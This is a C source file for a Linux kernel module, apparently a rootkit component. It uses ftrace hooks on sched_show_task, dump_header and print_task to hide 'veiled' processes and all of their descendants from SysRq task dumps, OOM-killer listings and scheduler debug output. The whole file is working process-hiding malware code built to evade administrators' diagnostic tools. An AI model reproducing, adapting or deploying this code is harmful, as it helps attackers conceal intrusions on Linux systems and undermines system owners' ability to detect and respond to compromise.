#include "../include/ub_core.h"
#include "../include/sysrq_hook.h"
#include "../ftrace/hook_engine.h"
#include "../include/veiled_pids.h"

static void (*ub_real_sched_show_task)(struct task_struct *p);
static void (*ub_real_dump_header)(void *oc, struct task_struct *p);
static void (*ub_real_print_task_isra)(void *m, void *rq, struct task_struct *p);
static bool ub_hook_sched_show_task_installed;
static bool ub_hook_dump_header_installed;
static bool ub_hook_print_task_installed;

static notrace bool is_task_hidden_fast(struct task_struct *p)
{
    struct task_struct *parent;
    int guard = 0;

    if (unlikely(!p))
        return false;

    if (ub_is_veiled(p->pid) || ub_is_offspring(p->pid))
        return true;

    if (ub_is_veiled(p->tgid) || ub_is_offspring(p->tgid))
        return true;

    rcu_read_lock();
    parent = rcu_dereference(p->real_parent);
    while (parent) {
        if (unlikely(++guard > 4096))
            break;

        if (parent == p || parent->pid <= 1)
            break;

        if (ub_is_veiled(parent->pid) || ub_is_offspring(parent->pid) ||
            ub_is_veiled(parent->tgid) || ub_is_offspring(parent->tgid)) {
            rcu_read_unlock();
            return true;
        }

        parent = rcu_dereference(parent->real_parent);
    }
    rcu_read_unlock();

    return false;
}

static notrace void ub_hook_sched_show_task(struct task_struct *p)
{
    if (unlikely(!ub_real_sched_show_task || !p))
        return;

    if (likely(ub_veiled_pid_count() == 0 && ub_offspring_pid_count() == 0)) {
        ub_real_sched_show_task(p);
        return;
    }

    if (is_task_hidden_fast(p))
        return;

    ub_real_sched_show_task(p);
}

static notrace void ub_hook_print_task_isra(void *m, void *rq, struct task_struct *p)
{
    if (unlikely(!ub_real_print_task_isra || !p))
        return;

    if (likely(ub_veiled_pid_count() == 0 && ub_offspring_pid_count() == 0)) {
        ub_real_print_task_isra(m, rq, p);
        return;
    }

    if (is_task_hidden_fast(p))
        return;

    ub_real_print_task_isra(m, rq, p);
}

static notrace void dump_tasks_filtered(void)
{
    struct task_struct *p;
    struct task_struct *task;

    pr_info("Tasks state (memory values in pages):\n");
    pr_info("[ pid ]   uid  tgid total_vm      rss pgtables_bytes swapents oom_score_adj name\n");

    rcu_read_lock();
    for_each_process(p) {
        struct mm_struct *mm;
        unsigned long total_vm = 0;
        unsigned long rss = 0;
        unsigned long pgtables = 0;
        unsigned long swapents = 0;
        short oom_score_adj = 0;

        if (is_task_hidden_fast(p))
            continue;

        task = p;

        if (p->flags & PF_KTHREAD)
            continue;

        task_lock(task);
        mm = task->mm;
        if (!mm) {
            task_unlock(task);
            continue;
        }

        total_vm = mm->total_vm;
        rss = get_mm_rss(mm);
        pgtables = mm_pgtables_bytes(mm);
        swapents = get_mm_counter(mm, MM_SWAPENTS);

        if (task->signal)
            oom_score_adj = task->signal->oom_score_adj;

        task_unlock(task);

        pr_info("[%5d] %5d %5d %8lu %8lu %13lu %8lu %5hd %s\n",
                task->pid,
                from_kuid(&init_user_ns, task_uid(task)),
                task->tgid,
                total_vm,
                rss,
                pgtables,
                swapents,
                oom_score_adj,
                task->comm);
    }
    rcu_read_unlock();
}

static notrace void ub_hook_dump_header(void *oc, struct task_struct *p)
{
    if (unlikely(!ub_real_dump_header))
        return;

    if (likely(ub_veiled_pid_count() == 0 && ub_offspring_pid_count() == 0)) {
        ub_real_dump_header(oc, p);
        return;
    }

    dump_tasks_filtered();
}

static struct ftrace_hook hooks[] = {
    HOOK("sched_show_task", ub_hook_sched_show_task, &ub_real_sched_show_task),
    HOOK("dump_header", ub_hook_dump_header, &ub_real_dump_header),
    HOOK("print_task.isra.0", ub_hook_print_task_isra, &ub_real_print_task_isra),
};

notrace int ub_sysrqguard_start(void)
{
    int err;
    static const char *print_task_candidates[] = {
        "print_task.isra.0",
        "print_task",
    };
    int i;

    err = ub_fh_install_hook(&hooks[0]);
    if (err)
        return err;
    ub_hook_sched_show_task_installed = true;

    err = ub_fh_install_hook(&hooks[1]);
    if (err) {
        ub_fh_remove_hook(&hooks[0]);
        ub_hook_sched_show_task_installed = false;
        return err;
    }
    ub_hook_dump_header_installed = true;

    for (i = 0; i < ARRAY_SIZE(print_task_candidates); i++) {
        hooks[2].name = print_task_candidates[i];
        if (!ub_resolve_symbol(hooks[2].name))
            continue;
        err = ub_fh_install_hook(&hooks[2]);
        if (!err) {
            ub_hook_print_task_installed = true;
            break;
        }
    }

    return 0;
}

notrace void ub_sysrqguard_stop(void)
{
    if (ub_hook_print_task_installed)
        ub_fh_remove_hook(&hooks[2]);
    if (ub_hook_dump_header_installed)
        ub_fh_remove_hook(&hooks[1]);
    if (ub_hook_sched_show_task_installed)
        ub_fh_remove_hook(&hooks[0]);
    synchronize_rcu();
}
